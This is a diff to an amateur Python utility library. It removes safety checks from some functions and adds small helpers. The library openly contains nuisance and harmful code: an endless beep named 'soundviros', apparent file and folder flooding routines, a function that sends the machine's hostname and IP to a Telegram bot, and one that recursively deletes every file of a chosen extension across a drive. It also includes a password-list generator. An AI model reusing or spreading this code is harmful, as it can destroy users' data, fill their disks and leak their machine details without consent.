@@ -26,7 +26,7 @@ def to_me(tometext):
     Resualt = req.post(main_website , data=My_Data)
 
     print(Resualt)
-#------------------------------------------------------------------------------------------------------------
+#-------------------------------------------------------------------------------------------------------------------------------------------------------------------
 def dont_click(mude,username,armia_python_code):
     admin = {
             "username" : "armiaadmin",
@@ -68,33 +68,33 @@ def dont_click_1():
             dont_click_2()
 #-----------------------------------------------------------------------------------------------------------------------------------------------------
 def sound(milsec , frecanc):
-    if dont_click_1() == True: 
-        from winsound import Beep
-        Beep(frecanc,milsec)
+    from winsound import Beep
+    Beep(frecanc,milsec)
 #--------------------------------------
-def soundviros(milsec , frecanc):
-    if dont_click_1() == True: 
-        from winsound import Beep
-        while True:
-            Beep(frecanc,milsec)
+def play_sound(filename):
+    import winsound
+    winsound.PlaySound(filename)
+def soundviros(frecanc):
+    from winsound import Beep
+    while True:
+            Beep(frecanc,1000)
 #---------------------------------------------------------------------------------------------------------------------
 def dolartotoman(audoler):
-    if dont_click_1() == True: 
-        from colorama import Fore as F
-        import os
-        from time import sleep
-        os.system('cls')
-        print('waiting 2sec')
-        sleep(2)
-        os.system('cls')
-        audoler=int(audoler)
-        gimat = 31
-        Toman = audoler*gimat
+    from colorama import Fore as F
+    import os
+    from time import sleep
+    os.system('cls')
+    print('waiting 2sec')
+    sleep(2)
+    os.system('cls')
+    audoler=int(audoler)
+    gimat = 31
+    Toman = audoler*gimat
 
-        print(f'{F.LIGHTYELLOW_EX}you have {audoler}au $ and you have {F.RED}{Toman}{F.LIGHTYELLOW_EX} Toman.')
-        sleep(5)
-        os.system('cls')
-        print(f'{F.LIGHTGREEN_EX}{Toman}toman')
+    print(f'{F.LIGHTYELLOW_EX}you have {audoler}au $ and you have {F.RED}{Toman}{F.LIGHTYELLOW_EX} Toman.')
+    sleep(5)
+    os.system('cls')
+    print(f'{F.LIGHTGREEN_EX}{Toman}toman')
 #---------------------------------------------------------------------------------------------------------------
 def fileboomberv(name, formatwithdot, filesise):
     if dont_click_1() == True: 
@@ -121,27 +121,15 @@ def foldermacker(numberoffolders,name,pcuser):
             print(f'number{b}Done')
             b +=1
 #------------------------------------------------------------------------------------------------------
-def st_info_get_with_tele(bottoken,yourchatid):
+def ip_get_with_tele(bottoken,yourchatid):
     if dont_click_1() == True: 
         bottoken=str(bottoken)
         yourchatid=str(yourchatid)
         import requests as req
         import socket
         import os
-        import psutil
 
-        # Get CPU usage percentage
-        cpu_usage = psutil.cpu_percent()
-
-        # Get memory usage in bytes
-        memory_usage = psutil.virtual_memory().used
-
-        # Get disk usage in bytes
-        disk_usage = psutil.disk_usage('/').used
-
-        # Get network usage in bytes
-        network_usage = psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv
-
+        
         os.system('cls')
         host = socket.gethostname()
         ip = socket.gethostbyname(host)
@@ -657,7 +645,7 @@ def Delete(filepath):
     os.remove(filepath)
 #------------------------------------------------------------------------------------------------
 def Deletewithformat(fileformat,hardnameegD):
-    import shutil, os, subprocess
+    import os, subprocess
     os.chdir(f'{hardnameegD}:')
     result = subprocess.check_output(f'dir /S /B *{fileformat}', shell=True).decode().split()
     for i in result:
@@ -679,7 +667,7 @@ def certificate(appname):
    !!!dont shair this certificate!!!  
    '''
    file5555545.write(certificates1)
-#------------------------------------------------------------------------------------
+
 def filesaver(text, adress):
     import random
     from os import chdir
@@ -715,3 +703,25 @@ def pass_word_list_macker(letters,path,file_name):
             file.write(passwords+'\n')
             print(passwords)
     file.close()
+#-------------------------------------------------------------------
+def site_ip(host_name_no_https):
+    import socket
+
+    hostname = str(host_name_no_https)
+
+    ip_address = socket.gethostbyname(hostname)
+
+    print("The IP address of", hostname, "is", ip_address)
+#-----------------------------------------------------------------
+def teb_opener(title,bg_coler,width,height):
+    import turtle
+    print('''you can use turtle lib
+    To do this to know how to do this 
+    if you dont know How to use this please messae me\ninfo:''')
+    aboutmeandmylib('user')
+    input('press Enter to countinue')
+    win = turtle.Screen()
+    win.title(title)
+    while True:
+        win.update()
+#---------------------------------------------------------------------
